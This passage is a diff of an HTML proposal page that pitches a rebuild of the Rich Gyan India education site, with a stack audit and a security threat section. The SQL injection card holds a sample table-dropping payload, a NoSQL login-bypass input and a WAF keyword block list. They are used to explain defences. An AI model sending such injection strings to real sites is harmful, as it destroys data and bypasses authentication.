-    .footer-brand { font-family: var(--font-head); font-weight: 700; color: rgba(255,255,255,0.85); font-size: 14px; }
-    .footer-brand span { color: var(--orange2); }
-    .footer-links { display: flex; gap: 1.5rem; list-style: none; }
-    .footer-links a { font-size: 12px; color: rgba(255,255,255,0.4); text-decoration: none; transition: color 0.2s; }
-    .footer-links a:hover { color: rgba(255,255,255,0.8); }
-    .footer-copy { font-size: 12px; color: rgba(255,255,255,0.3); width: 100%; margin-top: 0.5rem; }
+    /* TABS */
+    .proposal-tabs { display:flex; gap:6px; margin-bottom:1.5rem; flex-wrap:wrap; }
+    .tab-btn { font-size:12px; padding:7px 16px; border-radius:20px; border:0.5px solid var(--border); background:var(--bg2); color:var(--t2); cursor:pointer; transition:all .2s; font-family:var(--font-head); font-weight:600; }
+    .tab-btn.active { background:var(--navy); color:#fff; border-color:var(--navy); }
+    .tab-btn:hover:not(.active) { background:#e6f1fb; color:#185fa5; border-color:#b5d4f4; }
 
-    /* ───────────── INFO BANNER ───────────── */
-    .info-banner {
-      background: linear-gradient(135deg, #e6f1fb, #eef5fd);
-      border-radius: 10px; padding: 1rem 1.25rem;
-      font-size: 12px; color: #185fa5; line-height: 1.6;
-      margin-bottom: 1rem; border: 0.5px solid #b5d4f4;
-    }
-    .info-banner strong { display: block; margin-bottom: 4px; font-size: 13px; font-family: var(--font-head); }
-    .payment-note {
-      background: #e6f1fb; border-radius: 10px; padding: 1rem 1.25rem;
-      font-size: 12px; color: #185fa5; line-height: 1.6; margin-top: 1rem;
-      border: 0.5px solid #b5d4f4;
-    }
-    .payment-note strong { display: block; margin-bottom: 4px; font-size: 13px; font-family: var(--font-head); }
+    /* PHASE BLOCKS */
+    .phase-block { display:none; animation:fadeIn .3s ease; }
+    .phase-block.active { display:block; }
 
-    /* ───────────── RESPONSIVE ───────────── */
-    @media (max-width: 600px) {
-      .nav-links, .nav-cta { display: none; }
-      .nav-mobile-toggle { display: flex; }
-      .hero { padding: 2rem 1.5rem; }
-      .hero-title { font-size: 24px; }
-      .card-inner { padding: 1.5rem 1.25rem; }
-      .demo-section { padding: 1.5rem 1.25rem; }
-      .demo-grid { grid-template-columns: 1fr; }
-      .audit-grid, .deliverable-grid { grid-template-columns: 1fr; }
-      .cta-bar { flex-direction: column; align-items: flex-start; }
-      footer { flex-direction: column; align-items: flex-start; }
-      .footer-links { flex-wrap: wrap; gap: 1rem; }
-      .hero-meta { gap: 1rem; }
-    }
-    @media (max-width: 420px) {
-      .hero-title { font-size: 20px; }
-      .proposal-tabs { gap: 4px; }
-      .tab-btn { font-size: 11px; padding: 5px 12px; }
+    /* DELIVERABLE GRID */
+    .deliverable-grid { display:grid; grid-template-columns:1fr 1fr; gap:10px; margin-bottom:1.5rem; }
+    .deliv-card { background:var(--bg2); border:0.5px solid var(--border); border-radius:12px; padding:1rem; }
+    .deliv-icon { font-size:22px; color:var(--navy2); margin-bottom:8px; }
+    .deliv-title { font-size:13px; font-weight:600; color:var(--t1); margin-bottom:5px; font-family:var(--font-head); }
+    .deliv-items { font-size:12px; color:var(--t2); line-height:1.75; }
+    .deliv-items li { list-style:none; padding-left:14px; position:relative; }
+    .deliv-items li::before { content:'→'; position:absolute; left:0; color:var(--orange); font-size:11px; }
+
+    /* TECH CHIPS */
+    .tech-pill-row { display:flex; flex-wrap:wrap; gap:6px; margin-bottom:1.5rem; }
+    .tech-chip { font-size:11px; padding:4px 11px; border-radius:20px; background:var(--bg2); border:0.5px solid var(--border); color:var(--t1); font-weight:500; }
+    .tech-chip.highlight { background:#e6f1fb; border-color:#b5d4f4; color:#185fa5; font-weight:600; }
+
+    /* PRICING */
+    .pricing-row { display:flex; justify-content:space-between; align-items:center; padding:11px 0; border-bottom:0.5px solid var(--border); font-size:13px; }
+    .pricing-row:last-child { border:none; padding-top:16px; font-size:15px; font-weight:600; }
+    .price-label { color:var(--t2); }
+    .price-val { color:var(--t1); font-weight:600; font-family:var(--font-head); }
+    .price-val.total { color:var(--navy2); font-size:18px; }
+
+    /* TIMELINE */
+    .tl-item { display:flex; gap:14px; margin-bottom:1.1rem; align-items:flex-start; }
+    .tl-num { width:30px; height:30px; border-radius:50%; background:var(--navy); color:#fff; font-size:12px; font-weight:700; display:flex; align-items:center; justify-content:center; flex-shrink:0; font-family:var(--font-head); }
+    .tl-title { font-size:13px; font-weight:600; color:var(--t1); margin-bottom:2px; font-family:var(--font-head); }
+    .tl-desc { font-size:12px; color:var(--t2); line-height:1.55; }
+    .tl-weeks { font-size:11px; color:var(--orange); font-weight:600; margin-top:3px; font-family:var(--font-head); }
+
+    /* COMPARE BARS */
+    .compare-bar { margin:1.5rem 0 0; }
+    .compare-row { display:flex; align-items:center; gap:10px; margin-bottom:10px; font-size:12px; }
+    .compare-label { width:130px; color:var(--t2); flex-shrink:0; }
+    .bar-track { flex:1; height:6px; background:#e8eaf0; border-radius:3px; overflow:hidden; }
+    .bar-fill-before { height:100%; border-radius:3px; background:#e24b4a; }
+    .bar-fill-after { height:100%; border-radius:3px; background:#63991f; }
+    .bar-legend { display:flex; gap:1rem; margin-bottom:1rem; font-size:11px; font-weight:500; }
+    .bar-legend span { display:flex; align-items:center; gap:5px; }
+    .leg-dot { width:8px; height:8px; border-radius:50%; }
+
+    /* FLAGS */
+    .flag-list { margin-bottom:1.5rem; }
+    .flag-item { display:flex; gap:10px; padding:10px 0; border-bottom:0.5px solid var(--border); align-items:flex-start; font-size:13px; }
+    .flag-icon { font-size:16px; color:#e24b4a; flex-shrink:0; margin-top:1px; }
+    .flag-text { font-size:12.5px; color:var(--t2); line-height:1.6; }
+    .flag-text span { display:block; font-size:11.5px; color:var(--t2); margin-top:3px; opacity:.8; }
+
+    /* CTA BAR */
+    .cta-bar { background:linear-gradient(140deg,#060e20,#0c1b3a,#1a3a6b); border-radius:20px; margin-top:1.25rem; display:flex; justify-content:space-between; align-items:center; flex-wrap:wrap; gap:1rem; padding:2rem; }
+    .cta-text { font-size:14px; color:rgba(255,255,255,0.7); line-height:1.6; max-width:460px; }
+    .cta-text strong { color:#fff; display:block; font-size:16px; font-family:var(--font-head); margin-bottom:4px; }
+    .cta-btn { font-family:var(--font-head); font-size:13px; font-weight:700; padding:12px 28px; border-radius:10px; background:var(--orange); color:#fff; border:none; cursor:pointer; transition:background .2s; }
+    .cta-btn:hover { background:#d04e1e; }
+
+    /* INFO BANNER */
+    .info-banner { background:linear-gradient(135deg,#e6f1fb,#eef5fd); border-radius:10px; padding:1rem 1.25rem; font-size:12px; color:#185fa5; line-height:1.6; margin-bottom:1rem; border:0.5px solid #b5d4f4; }
+    .info-banner strong { display:block; margin-bottom:4px; font-size:13px; font-family:var(--font-head); }
+    .payment-note { background:#e6f1fb; border-radius:10px; padding:1rem 1.25rem; font-size:12px; color:#185fa5; line-height:1.6; margin-top:1rem; border:0.5px solid #b5d4f4; }
+    .payment-note strong { display:block; margin-bottom:4px; font-size:13px; font-family:var(--font-head); }
+
+    /* FOOTER */
+    footer { background:linear-gradient(140deg,#060e20,#0c1b3a); padding:2rem; border-radius:20px; margin-top:1.25rem; display:flex; justify-content:space-between; align-items:center; flex-wrap:wrap; gap:1rem; }
+    .footer-brand { font-family:var(--font-head); font-weight:700; color:rgba(255,255,255,0.85); font-size:14px; }
+    .footer-brand span { color:var(--orange2); }
+    .footer-links { display:flex; gap:1.5rem; list-style:none; }
+    .footer-links a { font-size:12px; color:rgba(255,255,255,0.4); text-decoration:none; transition:color .2s; }
+    .footer-links a:hover { color:rgba(255,255,255,0.8); }
+    .footer-copy { font-size:12px; color:rgba(255,255,255,0.3); width:100%; margin-top:0.5rem; }
+
+    @media (max-width:600px) {
+      .nav-links,.nav-cta { display:none; }
+      .nav-mobile-toggle { display:flex; }
+      .hero { padding:2rem 1.5rem; }
+      .hero-title { font-size:24px; }
+      .card-inner,.demo-section { padding:1.5rem 1.25rem; }
+      .demo-grid,.audit-grid,.deliverable-grid,.threat-cols { grid-template-columns:1fr; }
+      .cta-bar,.footer { flex-direction:column; align-items:flex-start; }
+      .footer-links { flex-wrap:wrap; gap:1rem; }
     }
   </style>
 </head>
 <body>
 
-<!-- ─────── NAV ─────── -->
 <nav>
-  <a class="nav-brand" href="#top">
-    <span class="nav-brand-dot"></span>
-    Subhajit · Dev
-  </a>
+  <a class="nav-brand" href="#top"><span class="nav-brand-dot"></span>Subhajit · Dev</a>
   <ul class="nav-links">
     <li><a href="#proof-of-work">Live Demos</a></li>
     <li><a href="#audit">Current Stack</a></li>
+    <li><a href="#security">Security</a></li>
     <li><a href="#scope">Proposal</a></li>
     <li><a href="#contact">Contact</a></li>
   </ul>
   <a class="nav-cta" href="mailto:?subject=Rich%20Gyan%20India%20-%20Discovery%20Call%20Request">Book a Call</a>
-  <div class="nav-mobile-toggle" onclick="toggleMobileMenu()">
+  <div class="nav-mobile-toggle" onclick="document.getElementById('contact').scrollIntoView({behavior:'smooth'})">
     <span></span><span></span><span></span>
   </div>
 </nav>
 
 <div class="page-wrap" id="top">
 
-  <!-- ─────── HERO ─────── -->
+  <!-- HERO -->
   <div class="hero">
     <div class="hero-orb1"></div>
     <div class="hero-orb2"></div>
-    <div class="hero-orb3"></div>
     <div class="hero-eyebrow">Technology Modernization Proposal · 2026</div>
     <div class="hero-title">Rich Gyan India —<br><em>Full-Stack Digital Rebuild</em></div>
-    <div class="hero-sub">A comprehensive proposal to transform richgyan.com into a high-performance, visually immersive, and enterprise-grade educational platform for 10,000+ students across India.</div>
+    <div class="hero-sub">A comprehensive proposal to transform richgyan.com into a high-performance, visually immersive, and enterprise-grade educational platform — secure by design, built for 50,000+ students across India.</div>
     <div class="hero-meta">
       <div class="hero-badge"><i class="ti ti-building"></i> Richgyan India Pvt. Ltd.</div>
       <div class="hero-badge"><i class="ti ti-calendar"></i> Proposal: 2026</div>
@@ -440,16 +334,16 @@
     </div>
   </div>
 
-  <!-- ─────── PROOF OF WORK ─────── -->
+  <!-- PROOF OF WORK -->
   <div class="card" id="proof-of-work">
     <div class="demo-section">
       <div class="section-label"><i class="ti ti-device-desktop-check"></i> Already built — live demos</div>
       <div class="demo-intro">
-        <strong>These aren't mockups.</strong> Before pitching this proposal, I already built two working prototypes for real institutions in Northeast India — deployed live on the web, fully functional, and ready for you to explore right now. This is the caliber of work you're investing in.
+        <strong>These aren't mockups.</strong> Before pitching this proposal, I already built two fully functional prototypes for real Northeast India institutions — deployed live, fully interactive, and ready to explore right now. This is the caliber of work Richgyan India is investing in.
       </div>
       <div class="demo-grid">
 
-        <!-- Demo 1 -->
+        <!-- Demo 1: Alloy Academy Goalpara — School Management System -->
         <div class="demo-card">
           <div class="demo-thumb demo-thumb-1">
             <div class="demo-thumb-grid"></div>
@@ -459,15 +353,33 @@
             <div class="demo-live-badge"><span class="live-dot"></span> LIVE</div>
           </div>
           <div class="demo-body">
-            <div class="demo-tag">Smart Campus Suite</div>
+            <div class="demo-tag">Smart Campus Management Suite</div>
             <div class="demo-title">Alloy Academy Goalpara</div>
-            <div class="demo-desc">Full school management system with face-recognition attendance, JWT auth, SMS/WhatsApp notifications, and PDF report generation. Built with React + Flask + MongoDB.</div>
+            <div class="demo-roles">
+              <span class="role-badge rb-admin">Admin</span>
+              <span class="role-badge rb-teacher">Teacher</span>
+              <span class="role-badge rb-student">Student</span>
+            </div>
+            <div class="demo-desc">A multi-role school management portal with 9 public pages and 3 protected dashboards — built specifically for an Indian educational institution. Every module is wired for real backend integration.</div>
+            <ul class="demo-feature-list">
+              <li>9 pages: Home, About, Notice Board, Calendar, Admission, Results, Gallery, Alumni, Contact</li>
+              <li>Student portal with login, marks viewer, fee status</li>
+              <li>Teacher dashboard for marks entry & class management</li>
+              <li>Admin panel — 8 modules: Students, Fees, Results, Admissions, Events, Notifications, Integrations</li>
+              <li>Twilio SMS/WhatsApp bulk notification system (ready to wire)</li>
+              <li>Razorpay fee collection, Cloudinary image storage (integration slots built)</li>
+              <li>Interactive calendar with upcoming events, exam dates, holidays</li>
+              <li>Online admission form with field validation</li>
+            </ul>
             <div class="demo-tech">
-              <span class="demo-chip">React</span>
-              <span class="demo-chip">Flask</span>
-              <span class="demo-chip">MongoDB</span>
-              <span class="demo-chip">DeepFace AI</span>
+              <span class="demo-chip">HTML5 / CSS3</span>
+              <span class="demo-chip">Vanilla JS</span>
+              <span class="demo-chip">Playfair Display + DM Sans</span>
+              <span class="demo-chip">Flask (planned)</span>
+              <span class="demo-chip">MongoDB (planned)</span>
               <span class="demo-chip">Twilio</span>
+              <span class="demo-chip">Razorpay</span>
+              <span class="demo-chip">Cloudinary</span>
             </div>
             <a class="demo-link" href="https://alloy-academy-goalpara-prototype.onrender.com" target="_blank" rel="noopener">
               <i class="ti ti-external-link"></i> View Live Demo
@@ -475,25 +387,41 @@
           </div>
         </div>
 
-        <!-- Demo 2 -->
+        <!-- Demo 2: ALLOY Academy NEET/JEE Coaching Landing Page -->
         <div class="demo-card">
           <div class="demo-thumb demo-thumb-2">
             <div class="demo-thumb-grid"></div>
             <div class="demo-thumb-icon demo-thumb-icon-2">
-              <i class="ti ti-books"></i>
+              <i class="ti ti-atom-2"></i>
             </div>
             <div class="demo-live-badge"><span class="live-dot"></span> LIVE</div>
           </div>
           <div class="demo-body">
-            <div class="demo-tag">School Management System</div>
-            <div class="demo-title">English School Prototype</div>
-            <div class="demo-desc">A full-featured English medium school portal with student management, attendance tracking, exam records, and parent-facing dashboards — designed for Northeast India institutions.</div>
+            <div class="demo-tag">Premium Coaching Institute Website</div>
+            <div class="demo-title">ALLOY Academy — NEET &amp; JEE Coaching</div>
+            <div class="demo-roles">
+              <span class="role-badge rb-3d">Three.js 3D</span>
+              <span class="role-badge rb-live">GSAP Animations</span>
+            </div>
+            <div class="demo-desc">A premium marketing website for a NEET &amp; JEE coaching institute in Goalpara, Assam — with 3D hero, smooth scroll reveals, topper showcase, and animated stats. Built to compete with big national coaching brands.</div>
+            <ul class="demo-feature-list">
+              <li>Three.js 3D animated hero canvas with interactive WebGL scene</li>
+              <li>GSAP + ScrollTrigger scroll-driven reveal animations throughout</li>
+              <li>Custom animated gold cursor with trailing ring</li>
+              <li>Scroll progress indicator bar</li>
+              <li>Topper showcase with live filter by year and exam (NEET/JEE)</li>
+              <li>Animated result stat counters (result band)</li>
+              <li>Interactive FAQ accordion section</li>
+              <li>3D location dot with pulsing rings for Goalpara map</li>
+            </ul>
             <div class="demo-tech">
-              <span class="demo-chip">React</span>
-              <span class="demo-chip">Flask</span>
-              <span class="demo-chip">MongoDB</span>
-              <span class="demo-chip">JWT Auth</span>
-              <span class="demo-chip">ReportLab</span>
+              <span class="demo-chip demo-chip-gold">Three.js r128</span>
+              <span class="demo-chip demo-chip-gold">GSAP 3.12</span>
+              <span class="demo-chip demo-chip-gold">ScrollTrigger</span>
+              <span class="demo-chip">Cormorant Garamond</span>
+              <span class="demo-chip">Outfit</span>
+              <span class="demo-chip">Vanilla JS</span>
+              <span class="demo-chip">CSS Animations</span>
             </div>
             <a class="demo-link" href="https://englishschoolprototype.onrender.com" target="_blank" rel="noopener">
               <i class="ti ti-external-link"></i> View Live Demo
@@ -505,63 +433,463 @@
     </div>
   </div>
 
-  <!-- ─────── CURRENT STACK ─────── -->
+  <!-- CURRENT STACK AUDIT -->
   <div class="card" id="audit">
     <div class="card-inner">
       <div class="section-label"><i class="ti ti-zoom-scan"></i> Current tech stack (reverse engineered)</div>
       <table class="stack-table">
-        <thead>
-          <tr><th>Layer</th><th>Detected Technology</th><th>Assessment</th></tr>
-        </thead>
+        <thead><tr><th>Layer</th><th>Detected Technology</th><th>Assessment</th></tr></thead>
         <tbody>
           <tr><td>CMS</td><td>WordPress + Elementor 3.30.2</td><td><span class="pill pill-amber">Outdated</span> Confirmed via meta-generator tag</td></tr>
-          <tr><td>E-commerce</td><td>WooCommerce</td><td><span class="pill pill-amber">Fragile</span> /basket/, /product/student-registraion/ URL patterns</td></tr>
-          <tr><td>Auth</td><td>WordPress native (no 2FA, no OTP)</td><td><span class="pill pill-red">Risky</span> No multi-factor, exposed /my-account/</td></tr>
-          <tr><td>LMS</td><td>LearnDash or free plugin (likely)</td><td><span class="pill pill-amber">Unclear</span> /study-materials/, /download/ routes</td></tr>
-          <tr><td>Certificates</td><td>Static custom page</td><td><span class="pill pill-red">No DB</span> No dynamic verification system detected</td></tr>
-          <tr><td>Hosting</td><td>Shared/VPS (inferred)</td><td><span class="pill pill-amber">Limited</span> Slow response times observed</td></tr>
-          <tr><td>API layer</td><td>None detected</td><td><span class="pill pill-red">Monolithic</span> Everything coupled to WP</td></tr>
+          <tr><td>E-commerce</td><td>WooCommerce</td><td><span class="pill pill-amber">Fragile</span> /basket/, /product/ URL patterns detected</td></tr>
+          <tr><td>Auth</td><td>WordPress native (no 2FA, no OTP)</td><td><span class="pill pill-red">Risky</span> No MFA, exposed /my-account/ endpoint</td></tr>
+          <tr><td>LMS</td><td>Plugin-based (likely LearnDash)</td><td><span class="pill pill-amber">Unclear</span> /study-materials/, /download/ routes found</td></tr>
+          <tr><td>Certificates</td><td>Static custom page</td><td><span class="pill pill-red">No DB</span> No dynamic verification — easily forged</td></tr>
+          <tr><td>Hosting</td><td>Shared/VPS (inferred)</td><td><span class="pill pill-amber">Limited</span> Slow response times, no CDN detected</td></tr>
+          <tr><td>API layer</td><td>None detected</td><td><span class="pill pill-red">Monolithic</span> Everything tightly coupled to WordPress</td></tr>
           <tr><td>Mobile app</td><td>White-labeled 3rd party (co.sheldon.siupl)</td><td><span class="pill pill-red">Not owned</span> No brand control, no custom logic</td></tr>
-          <tr><td>Domains</td><td>richgyan.com + richgyan.in (separate installs)</td><td><span class="pill pill-red">Duplicated</span> Inconsistent content, SEO split</td></tr>
+          <tr><td>Domains</td><td>richgyan.com + richgyan.in (separate installs)</td><td><span class="pill pill-red">Duplicated</span> Split SEO, inconsistent content, user confusion</td></tr>
+          <tr><td>Security headers</td><td>Not detected</td><td><span class="pill pill-red">Missing</span> No CSP, no X-Frame-Options, no HSTS</td></tr>
         </tbody>
       </table>
     </div>
   </div>
 
-  <!-- ─────── PAIN POINTS ─────── -->
+  <!-- PAIN POINTS -->
   <div class="card">
     <div class="card-inner">
       <div class="section-label"><i class="ti ti-alert-triangle"></i> Current platform pain points</div>
       <div class="audit-grid">
         <div class="audit-card bad">
           <div class="audit-title"><span class="status-dot dot-bad"></span>No real certificate verification</div>
-          <div class="audit-desc">Certificates are visually present but have no live database lookup — easily forged, zero employer trust signal.</div>
+          <div class="audit-desc">Certificates are visually present but have no live database lookup — easily forged, zero employer trust signal for 50,000+ students.</div>
         </div>
         <div class="audit-card bad">
           <div class="audit-title"><span class="status-dot dot-bad"></span>Zero mobile app ownership</div>
-          <div class="audit-desc">White-labeled app on a 3rd party's infra. If that vendor closes, your students lose access overnight.</div>
+          <div class="audit-desc">White-labeled app on a 3rd party's infra. If that vendor closes, your students lose access overnight. You own nothing.</div>
         </div>
         <div class="audit-card bad">
-          <div class="audit-title"><span class="status-dot dot-bad"></span>No API layer / headless design</div>
-          <div class="audit-desc">Everything is tightly coupled to WordPress. Scaling, integrations, or any rebuild requires touching the entire monolith.</div>
+          <div class="audit-title"><span class="status-dot dot-bad"></span>No security headers installed</div>
+          <div class="audit-desc">CSP, X-Frame-Options, HSTS, and other critical headers are absent — leaving the site open to clickjacking, XSS, and protocol downgrade attacks.</div>
         </div>
         <div class="audit-card warn">
           <div class="audit-title"><span class="status-dot dot-warn"></span>Weak authentication</div>
-          <div class="audit-desc">No OTP, no 2FA. Student accounts and franchise dashboards are protected by passwords alone.</div>
+          <div class="audit-desc">No OTP, no 2FA. Student accounts and franchise dashboards protected by passwords alone — a single phishing email breaks everything.</div>
         </div>
         <div class="audit-card warn">
           <div class="audit-title"><span class="status-dot dot-warn"></span>Duplicate domain problem</div>
-          <div class="audit-desc">richgyan.com and richgyan.in run independently, splitting SEO authority and confusing users.</div>
+          <div class="audit-desc">richgyan.com and richgyan.in run independently, splitting SEO authority and confusing users and franchise partners.</div>
         </div>
         <div class="audit-card ok">
-          <div class="audit-title"><span class="status-dot dot-ok"></span>SSL present, MSME registered</div>
-          <div class="audit-desc">Basic security and legal compliance are in place — a solid foundation to build on.</div>
+          <div class="audit-title"><span class="status-dot dot-ok"></span>SSL present + MSME registered</div>
+          <div class="audit-desc">Basic HTTPS and legal compliance are in place — ISO 9001:2015 certified, government registered. A solid legal foundation to build on.</div>
         </div>
       </div>
     </div>
   </div>
 
-  <!-- ─────── SCOPE / TABS ─────── -->
+  <!-- ═══════════════ SECURITY THREATS ═══════════════ -->
+  <div class="card" id="security">
+    <div class="card-inner">
+      <div class="section-label"><i class="ti ti-shield-exclamation"></i> Security threat analysis — deep dive</div>
+      <div class="sec-intro-banner">
+        <i class="ti ti-alert-hexagon sec-intro-icon"></i>
+        <div class="sec-intro-text">
+          <strong>Why this section matters more than design.</strong>
+          Richgyan India manages data for 50,000+ students, 11,000+ trainers, and franchise centers across the country. A single security breach can expose every student's PII, allow certificate forgery at scale, destroy employer trust built over 8 years, and invite regulatory action under India's DPDP Act 2023. Every threat below has been identified from the live richgyan.com stack — and every solution is part of the rebuild proposal.
+        </div>
+      </div>
+
+      <div class="threat-list">
+
+        <!-- 1. Certificate Forgery -->
+        <div class="threat-card" id="tc1">
+          <div class="threat-header" onclick="toggleThreat('tc1')">
+            <div class="threat-header-left">
+              <div class="threat-icon ti-crit"><i class="ti ti-certificate-off"></i></div>
+              <div>
+                <div class="threat-name">Certificate Forgery &amp; Verification Bypass</div>
+                <div class="threat-short">Anyone can fake a Richgyan certificate — there's no database to check against</div>
+              </div>
+            </div>
+            <div style="display:flex;align-items:center;gap:10px">
+              <span class="threat-sev sev-crit">Critical</span>
+              <i class="ti ti-chevron-down threat-chevron"></i>
+            </div>
+          </div>
+          <div class="threat-body">
+            <div class="threat-col-title">🔍 How this attack works</div>
+            <div class="threat-explain">
+              Your current certificate verification page at <code>/certificate-verification/</code> is a static HTML page — it has no backend database query. An attacker can open any image editor, duplicate a real certificate template, change the name, dates, and course name, and print a fully convincing fake. There is zero technical barrier. Additionally, since there's no cryptographic signature or tamper-evident hash, even a real certificate can be altered after issuance. This is called a <strong>document forgery attack</strong> — it requires no hacking skill whatsoever.
+            </div>
+            <div class="threat-col-title">💥 Impact on Richgyan India</div>
+            <ul class="threat-impact">
+              <li>Fake certificate holders get jobs using Richgyan's name — destroying your brand with employers</li>
+              <li>Legitimate students lose credibility when employers can't verify their certificates</li>
+              <li>Franchise centers can issue unauthorized certificates with no oversight</li>
+              <li>Legal liability if forged certificates are used for government job applications</li>
+            </ul>
+            <div class="threat-solution">
+              <div class="threat-sol-title">✅ Our Solution</div>
+              <ul class="threat-sol-items">
+                <li>Each certificate gets a <strong>unique UUID</strong> stored in a PostgreSQL database at issuance time</li>
+                <li>A <strong>SHA-256 cryptographic hash</strong> of all certificate fields is stored — any field change invalidates it</li>
+                <li>QR code printed on every certificate links to <code>richgyan.com/verify/[UUID]</code> — instant verification</li>
+                <li>Employer-facing public API: <code>GET /api/v1/verify?cert_id=xxx</code> returns verified JSON</li>
+                <li>PDF certificates generated with <strong>digital signature</strong> using ReportLab + Python cryptography library</li>
+                <li>Admin panel shows full issuance history with franchise center ID — full audit trail</li>
+              </ul>
+            </div>
+            <div class="threat-tech-chips">
+              <span class="ttech ttech-green">PostgreSQL UUID</span>
+              <span class="ttech ttech-green">SHA-256 Hash</span>
+              <span class="ttech ttech-green">QR Code Generation</span>
+              <span class="ttech ttech-green">ReportLab PDF Sign</span>
+              <span class="ttech">Public Verify API</span>
+            </div>
+          </div>
+        </div>
+
+        <!-- 2. Broken Authentication -->
+        <div class="threat-card" id="tc2">
+          <div class="threat-header" onclick="toggleThreat('tc2')">
+            <div class="threat-header-left">
+              <div class="threat-icon ti-crit"><i class="ti ti-lock-open-off"></i></div>
+              <div>
+                <div class="threat-name">Broken Authentication &amp; Session Hijacking</div>
+                <div class="threat-short">No OTP, no 2FA — student &amp; admin accounts fall to a single phishing email</div>
+              </div>
+            </div>
+            <div style="display:flex;align-items:center;gap:10px">
+              <span class="threat-sev sev-crit">Critical</span>
+              <i class="ti ti-chevron-down threat-chevron"></i>
+            </div>
+          </div>
+          <div class="threat-body">
+            <div class="threat-col-title">🔍 How this attack works</div>
+            <div class="threat-explain">
+              The current system uses WordPress native login — username + password only. Attackers exploit this in three ways: (1) <strong>Credential stuffing</strong> — using leaked password databases (millions of Indian email/password combos are freely available on Telegram) to try bulk logins. (2) <strong>Phishing</strong> — sending a fake "Richgyan login" page to students or franchise owners to steal credentials. (3) <strong>Session fixation</strong> — WordPress session cookies don't rotate on login, allowing an attacker who intercepts one cookie (on a public WiFi) to maintain access forever. Your exposed <code>/my-account/</code> and <code>/richgyan</code> (center login) endpoints have no rate limiting, meaning an attacker can try <em>thousands of passwords per minute</em>.
+            </div>
+            <div class="threat-col-title">💥 Impact on Richgyan India</div>
+            <ul class="threat-impact">
+              <li>Admin account takeover exposes all 50,000+ student records instantly</li>
+              <li>Franchise center accounts compromised — fake enrollment, fee fraud</li>
+              <li>Student portal breach exposes marks, fee details, personal addresses</li>
+              <li>No audit log means you wouldn't even know a breach happened</li>
+            </ul>
+            <div class="threat-solution">
+              <div class="threat-sol-title">✅ Our Solution</div>
+              <ul class="threat-sol-items">
+                <li><strong>OTP-first login</strong> via Twilio SMS — phone number + OTP, no password required for students</li>
+                <li><strong>JWT with refresh token rotation</strong> — every session refresh invalidates the old token (httpOnly, Secure, SameSite=Strict cookies)</li>
+                <li><strong>Role-based access control (RBAC)</strong> — Student / Teacher / Franchise Owner / Admin — strict server-side enforcement</li>
+                <li><strong>Redis rate limiter</strong> — max 5 failed OTP attempts per phone per 15 minutes, then 1-hour lockout</li>
+                <li><strong>Login audit log</strong> — every login recorded with IP, device fingerprint, timestamp in database</li>
+                <li>Optional <strong>TOTP 2FA</strong> (Google Authenticator) for Admin and Franchise owners</li>
+              </ul>
+            </div>
+            <div class="threat-tech-chips">
+              <span class="ttech ttech-green">Twilio OTP</span>
+              <span class="ttech ttech-green">JWT Rotation</span>
+              <span class="ttech ttech-green">Redis Rate Limit</span>
+              <span class="ttech ttech-green">RBAC</span>
+              <span class="ttech">TOTP (pyotp)</span>
+              <span class="ttech">Audit Logging</span>
+            </div>
+          </div>
+        </div>
+
+        <!-- 3. SQL/NoSQL Injection -->
+        <div class="threat-card" id="tc3">
+          <div class="threat-header" onclick="toggleThreat('tc3')">
+            <div class="threat-header-left">
+              <div class="threat-icon ti-high"><i class="ti ti-database-exclamation"></i></div>
+              <div>
+                <div class="threat-name">SQL / NoSQL Injection</div>
+                <div class="threat-short">Unsanitized inputs in WooCommerce or any form can dump your entire student database</div>
+              </div>
+            </div>
+            <div style="display:flex;align-items:center;gap:10px">
+              <span class="threat-sev sev-high">High</span>
+              <i class="ti ti-chevron-down threat-chevron"></i>
+            </div>
+          </div>
+          <div class="threat-body">
+            <div class="threat-col-title">🔍 How this attack works</div>
+            <div class="threat-explain">
+              Any form field that passes user input directly into a database query is injectable. For WordPress/WooCommerce, search inputs, contact forms, and the student registration product are common targets. Example of a classic SQL injection payload in a search field:<br><br>
+              <div class="code-block"><span class="kw">GET</span> /wp-json/wc/v3/products?<span class="str">search=' OR 1=1; DROP TABLE wp_users; --</span></div>
+              If the query is not parameterized, this executes inside your database. For MongoDB (planned), the equivalent is a <strong>NoSQL injection</strong> using JSON operator abuse: submitting <code>{"$gt": ""}</code> as a password field can bypass authentication entirely if the query is built from raw user input. WordPress has historical SQL injection CVEs in WooCommerce, especially in older unpatched versions.
+            </div>
+            <div class="threat-col-title">💥 Impact on Richgyan India</div>
+            <ul class="threat-impact">
+              <li>Complete student database dump — names, phone numbers, addresses, payment history</li>
+              <li>Admin credentials extracted and cracked offline</li>
+              <li>Database tables deleted — complete data destruction with no backup</li>
+              <li>DPDP Act 2023 violation — mandatory breach notification + financial penalties</li>
+            </ul>
+            <div class="threat-solution">
+              <div class="threat-sol-title">✅ Our Solution</div>
+              <ul class="threat-sol-items">
+                <li><strong>Parameterized queries everywhere</strong> — SQLAlchemy ORM with PostgreSQL; Mongoose schema validation with MongoDB — raw string interpolation into queries is banned in the codebase</li>
+                <li><strong>Input validation layer</strong> — Pydantic (Python) or Joi (Node.js) validates and sanitizes every API request before it touches the database</li>
+                <li><strong>Mongoose strict schema</strong> — unknown fields silently stripped; <code>$</code>-prefixed keys rejected at middleware level</li>
+                <li><strong>Database user with minimum privileges</strong> — the app DB user cannot DROP tables or access system tables</li>
+                <li>WAF rule: block payloads containing <code>$gt, $ne, $where, OR 1=1, UNION SELECT, DROP TABLE</code></li>
+              </ul>
+            </div>
+            <div class="threat-tech-chips">
+              <span class="ttech ttech-green">SQLAlchemy ORM</span>
+              <span class="ttech ttech-green">Pydantic Validation</span>
+              <span class="ttech ttech-green">Mongoose Schema</span>
+              <span class="ttech">Cloudflare WAF</span>
+              <span class="ttech">Least Privilege DB</span>
+            </div>
+          </div>
+        </div>
+
+        <!-- 4. XSS -->
+        <div class="threat-card" id="tc4">
+          <div class="threat-header" onclick="toggleThreat('tc4')">
+            <div class="threat-header-left">
+              <div class="threat-icon ti-high"><i class="ti ti-code-dots"></i></div>
+              <div>
+                <div class="threat-name">Cross-Site Scripting (XSS)</div>
+                <div class="threat-short">Injecting malicious scripts via contact forms, notice boards, or admin comment fields</div>
+              </div>
+            </div>
+            <div style="display:flex;align-items:center;gap:10px">
+              <span class="threat-sev sev-high">High</span>
+              <i class="ti ti-chevron-down threat-chevron"></i>
+            </div>
+          </div>
+          <div class="threat-body">
+            <div class="threat-col-title">🔍 How this attack works</div>
+            <div class="threat-explain">
